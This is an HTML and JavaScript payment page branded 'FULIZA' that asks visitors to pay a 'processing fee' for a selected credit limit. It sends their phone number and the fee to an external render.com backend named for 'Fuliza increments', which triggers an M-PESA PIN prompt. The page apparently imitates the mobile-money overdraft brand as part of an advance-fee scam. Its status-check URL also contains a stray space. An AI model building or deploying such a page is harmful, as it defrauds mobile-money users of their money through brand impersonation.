<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Processing Fee Payment</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    min-height: 100vh;
    min-height: 100dvh;
    background: #E8F7EF;
    font-family: 'Mali', cursive;
    color: #006B3F;
    display: flex;
    flex-direction: column;
}

.container {
    width: 92%;
    max-width: 480px;
    margin: auto;
}

header {
    background: #00A651;
    color: #fff;
    padding: 12px 0;
    text-align: center;
    flex-shrink: 0;
}

.logo {
    font-size: 22px;
    font-weight: 700;
}

main {
    flex: 1;
    width: 100%;
}

.card {
    background: #fff;
    margin-top: 12px;
    padding: 14px;
    border-radius: 12px;
    box-shadow: 0 2px 9px rgba(0,107,63,.07);
    border: 1px solid #B7E5CC;
}

h1 {
    color: #fff;
    background: #00A651;
    padding: 9px 7px;
    border-radius: 8px;
    font-size: 20px;
    font-weight: 700;
    text-align: center;
    margin-bottom: 9px;
}

.subtitle {
    background: #E8F7EF;
    color: #000;
    padding: 9px;
    border-radius: 8px;
    font-size: 13px;
    text-align: center;
    margin-bottom: 10px;
    border: 1px solid #B7E5CC;
}

.summary {
    background: #fff;
    border-radius: 9px;
    padding: 7px 11px;
    margin-bottom: 10px;
    border: 1px solid #B7E5CC;
}

.row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 8px;
    padding: 6px 0;
    font-size: 13px;
}

.row + .row {
    border-top: 1px solid #B7E5CC;
}

.label, .value {
    color: #000;
}

.value {
    font-weight: 700;
    white-space: nowrap;
}

label {
    display: block;
    font-size: 13px;
    font-weight: 600;
    margin-bottom: 5px;
}

input {
    width: 100%;
    padding: 11px;
    border: 1px solid #B7E5CC;
    border-radius: 8px;
    font-family: 'Mali', cursive;
    font-size: 14px;
    outline: none;
    margin-bottom: 9px;
    background: #fff;
    color: #000;
}

input:focus {
    border-color: #00A651;
}

.btn {
    width: 100%;
    padding: 11px;
    border: 0;
    border-radius: 9px;
    background: #00A651;
    color: #fff;
    font-family: 'Mali', cursive;
    font-size: 17px;
    font-weight: 600;
    cursor: pointer;
}

.btn:disabled {
    opacity: .6;
    cursor: not-allowed;
}

.message {
    min-height: 18px;
    margin-top: 7px;
    padding: 0;
    background: transparent;
    border: none;
    color: #006B3F;
    font-size: 12px;
    line-height: 1.4;
    text-align: center;
}

/* FOOTER FIXED TO BOTTOM OF PAGE */

footer {
    width: 100%;
    flex-shrink: 0;
    text-align: center;
    padding: 18px 8px 20px;
    margin-top: auto;
    color: #006B3F;
    font-size: 11px;
    line-height: 1.8;
}

footer a {
    color: #006B3F;
    text-decoration: none;
}

@media(max-width:360px) {
    .card {
        padding: 12px 10px;
    }

    h1 {
        font-size: 18px;
    }

    .btn {
        font-size: 16px;
    }
}
</style>
</head>

<body>

<header>
    <div class="container">
        <div class="logo">FULIZA</div>
    </div>
</header>

<main>
<div class="container">

<section class="card">

<h1>Processing Fee Payment</h1>

<p class="subtitle">
Complete the payment using your M-PESA phone number.
</p>

<div class="summary">
    <div class="row">
        <span class="label">Selected processing fee</span>
        <span class="value" id="selectedService">—</span>
    </div>

    <div class="row">
        <span class="label">Processing Fee</span>
        <span class="value" id="serviceFee">—</span>
    </div>
</div>

<form id="paymentForm">

    <label for="phone">M-PESA Phone Number</label>

    <input
        type="tel"
        id="phone"
        placeholder="07XXXXXXXX"
        inputmode="numeric"
        autocomplete="tel"
        maxlength="10"
        required
    >

    <button type="submit" class="btn" id="paymentBtn">
        Pay Processing Fee
    </button>

</form>

<div class="message" id="paymentMessage"></div>

</section>

</div>
</main>

<footer>
    <a href="#">Terms &amp; Conditions</a> |
    <a href="#">Privacy Policy</a> |
    <a href="#">Support</a>
    <br>
    © 2026 Fuliza. All rights reserved.
</footer>

<script>

// PAYMENT DETAILS

const selectedServiceElement =
    document.getElementById("selectedService");

const serviceFeeElement =
    document.getElementById("serviceFee");

const paymentForm =
    document.getElementById("paymentForm");

const paymentBtn =
    document.getElementById("paymentBtn");

const phoneInput =
    document.getElementById("phone");

const paymentMessage =
    document.getElementById("paymentMessage");

const selectedLimit =
    sessionStorage.getItem("selectedLimit");

const serviceFee =
    sessionStorage.getItem("serviceFee");

if (!selectedLimit || !serviceFee) {

    selectedServiceElement.textContent = "Not selected";
    serviceFeeElement.textContent = "Not available";

    paymentBtn.disabled = true;

    paymentMessage.textContent =
        "No service selection was found.";

    setTimeout(() => {
        window.location.href = "amount.html";
    }, 1500);

} else {

    selectedServiceElement.textContent =
        "KSh " + Number(selectedLimit).toLocaleString();

    serviceFeeElement.textContent =
        "KSh " + Number(serviceFee).toLocaleString();
}


// PHONE NORMALIZATION

function normalizePhone(phone) {

    phone = String(phone).replace(/\s+/g, "");

    if (phone.startsWith("0")) {
        phone = "254" + phone.substring(1);
    }

    if (phone.startsWith("+254")) {
        phone = phone.substring(1);
    }

    return phone;
}


// SUBMIT PAYMENT

paymentForm.addEventListener("submit", async function(event) {

    event.preventDefault();

    const enteredPhone = phoneInput.value.trim();

    const phonePattern = /^(07|01)\d{8}$/;

    if (!phonePattern.test(enteredPhone)) {

        alert("Please enter a valid Kenyan phone number.");

        phoneInput.focus();

        return;
    }

    const phone = normalizePhone(enteredPhone);

    localStorage.setItem("paymentPhone", enteredPhone);

    paymentBtn.textContent = "Sending STK Push...";
    paymentBtn.disabled = true;

    paymentMessage.textContent =
        "Please wait while we send the M-PESA payment request.";

    try {

        const response = await fetch("https://fuliza-increments-2026-and-2027-zsc7.onrender.com/stk-push", {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    phone: phone,
                    amount: Number(serviceFee)
                })
            }
        );

        const responseText = await response.text();

let data;

try {
    data = JSON.parse(responseText);
} catch {
    throw new Error(
        "Server returned an empty or invalid response. Please check your backend."
    );
}

        if (!response.ok || !data.success) {
            throw new Error("No payment transaction ID received.");
        }

        const transactionId =
            data.transactionId ||
            data.checkout_request_id;

        if (!transactionId) {
            throw new Error("No Paylor transaction ID received.");
        }

        paymentBtn.textContent = "Processing...";

        paymentMessage.textContent =
            "An M-PESA payment request has been sent to your phone. Enter your M-PESA PIN to complete the payment.";

        checkPayment(transactionId);

    } catch (error) {

        console.log("PAYMENT ERROR:", error);

        paymentMessage.textContent =
            error.message || "Payment request failed.";

        paymentBtn.textContent = "Pay Processing Fee";
        paymentBtn.disabled = false;
    }

});


// CHECK PAYMENT STATUS

async function checkPayment(transactionId) {

    let attempts = 0;
    const maxAttempts = 40;

    const interval = setInterval(async () => {

        attempts++;

        if (attempts > maxAttempts) {

            clearInterval(interval);

            paymentMessage.textContent =
                "Payment confirmation is taking longer than expected. Please check your M-PESA messages before trying again.";

            paymentBtn.textContent = "Pay Processing Fee";
            paymentBtn.disabled = false;

            return;
        }

        try {

            const response = await fetch("https://fuliza-increments-2026-and-2027-zsc7.onrender.com /payment-status", {
                    method: "POST",

                    headers: {
                        "Content-Type": "application/json"
                    },

                    body: JSON.stringify({
                        transactionId: transactionId
                    })
                }
            );

            const responseText = await response.text();

let result;

try {
    result = JSON.parse(responseText);
} catch {
    console.error("Invalid payment status response:", responseText);
    return;
}

            if (!result.success) return;

            const status = String(
                result.status ||
                result.data?.status ||
                ""
            ).toUpperCase();

            if (status === "COMPLETED") {

                clearInterval(interval);

                paymentMessage.textContent =
                    "Payment successful. Redirecting...";

                window.location.href = "delivery.html";

            } else if (
                status === "FAILED" ||
                status === "CANCELLED"
            ) {

                clearInterval(interval);

                paymentMessage.textContent =
                    "Payment " + status.toLowerCase() + ".";

                paymentBtn.textContent = "Pay Processing Fee";
                paymentBtn.disabled = false;
            }

        } catch (error) {

            console.log("STATUS ERROR:", error);
        }

    }, 3000);
}

</script>

</body>
  </html>
